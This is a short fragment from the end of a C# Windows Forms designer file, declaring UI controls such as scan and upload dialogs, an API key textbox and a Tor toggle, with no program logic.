        private System.Windows.Forms.DataGridViewTextBoxColumn sysCol;
        private System.Windows.Forms.Label prefixLabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox prefixTextBox;
        private System.Windows.Forms.ToolStripMenuItem cmdUpdate;
        private System.Windows.Forms.Label apiLabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox RITextBox;
        private Bunifu.Framework.UI.BunifuFlatButton browseButton2;
        private Bunifu.Framework.UI.BunifuMetroTextbox fileNameEdit2;
        private System.Windows.Forms.OpenFileDialog scanDialog;
        private System.Windows.Forms.PictureBox resultBox;
        private Bunifu.Framework.UI.BunifuFlatButton scanButton;
        private System.Windows.Forms.Label progressLabel;
        private System.Windows.Forms.OpenFileDialog uploadDialog;
        private Bunifu.Framework.UI.BunifuFlatButton clearButton;
        private Bunifu.Framework.UI.BunifuFlatButton resetButton;
        private System.Windows.Forms.Label RILabel;
        private Bunifu.Framework.UI.BunifuMetroTextbox apiTextBox;
        private System.Windows.Forms.ToolStripMenuItem DeleteStripMenuItem1;
        private Bunifu.Framework.UI.BunifuFlatButton TorButton;
        private Bunifu.Framework.UI.BunifuCheckbox torCheck1;
        private System.Windows.Forms.Label torLabel1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label logoLabel;
    }
}

